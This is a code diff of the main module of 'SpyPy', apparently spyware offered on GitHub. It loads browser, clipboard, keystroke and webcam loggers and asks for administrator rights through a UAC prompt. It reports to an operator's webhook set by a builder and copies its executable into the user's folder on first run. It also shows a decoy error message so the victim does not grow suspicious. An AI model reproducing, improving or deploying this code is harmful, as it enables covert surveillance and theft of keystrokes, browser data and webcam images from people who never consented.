@@ -1,5 +1,3 @@
-# TODO Fix this damn code
-# this code is so broken i genuinely have a headache
 import tempfile
 import os
 import threading
@@ -8,8 +6,8 @@ import sys
 import subprocess
 import ctypes
 
-from utils import *
 
+from utils import *
 from loggers.browser_logger import BrowserLogger
 from loggers.clipboard_logger import ClipboardLogger
 from loggers.input_logger import InputLogger
@@ -22,10 +20,10 @@ from loggers.webcam_logger import WebcamLogger
 ###############################
 # DO NOT MODIFY THESE VALUES! #
 # THEY ARE SET BY THE BUILDER #
-WEBHOOK_URL = ""  #
-SOFTWARE_EXE_NAME = ""  #
-SOFTWARE_DIR_NAME = ""  #
-CUSTOM_ERROR_MESSAGE = None  #
+WEBHOOK_URL = ""              #
+SOFTWARE_EXE_NAME = ""        #
+SOFTWARE_DIR_NAME = ""        #
+CUSTOM_ERROR_MESSAGE = None   #
 ###############################
 
 
@@ -33,17 +31,14 @@ class SpyPy:
     def __init__(self):
         if not is_admin():
             try:
-                if get_platform() == "Windows":
-
-                    ctypes.windll.shell32.ShellExecuteW(
-                        None, "runas", sys.executable, "", None, 1
-                    )
-                    os._exit(0)
-                else:
-
-                    os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
+                ctypes.windll.shell32.ShellExecuteW(
+                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
+                )
             except Exception as e:
-                send_webhook("Could not elevate permissions.. Running as user.")
+                send_webhook(
+                    WEBHOOK_URL, "FATAL ERROR: COULD NOT GET ADMIN PRIVILEGES. PLEASE TRY AGAIN OR CHECK LOGS."
+                )
+                os._exit(1)
 
         self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
         self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)
@@ -89,7 +84,7 @@ class SpyPy:
                 self.loggers.append(logger())
         except Exception as e:
             send_webhook(
-                "FATAL ERROR: COULD NOT INITIALIZE LOGGERS. PLEASE TRY BUILDING AGAIN OR OPEN AN ISSUE ON GITHUB."
+                WEBHOOK_URL, "FATAL ERROR: COULD NOT INITIALIZE LOGGERS. PLEASE TRY BUILDING AGAIN OR OPEN AN ISSUE ON GITHUB."
             )
             os._exit(1)
 
@@ -109,11 +104,10 @@ class SpyPy:
 
     def setup(self):
         if self.is_exe:
-
             if not os.path.exists(self.first_run_flag):
                 try:
+                    send_webhook(WEBHOOK_URL, f"{SOFTWARE_EXE_NAME} has been executed for the first time. Setting up...")
                     open(self.first_run_flag, "w").close()
-
                     current_exe = sys.executable
                     new_exe = os.path.join(
                         self.software_dir, os.path.basename(current_exe)
@@ -131,8 +125,10 @@ class SpyPy:
                         "FATAL ERROR: COULD NOT SETUP FIRST RUN. PLEASE TRY AGAIN OR CHECK LOGS."
                     )
                     os._exit(1)
+            else:
+                send_webhook(WEBHOOK_URL, f"{SOFTWARE_EXE_NAME} has been executed. Starting SpyPy...")
         else:
-            send_webhook(WEBHOOK_URL, f"SpyPy has been executed on {get_platform()}")
+            send_webhook(WEBHOOK_URL, f"SpyPy has been executed...")
             if CUSTOM_ERROR_MESSAGE:
                 display_error_message("Error", CUSTOM_ERROR_MESSAGE)
 
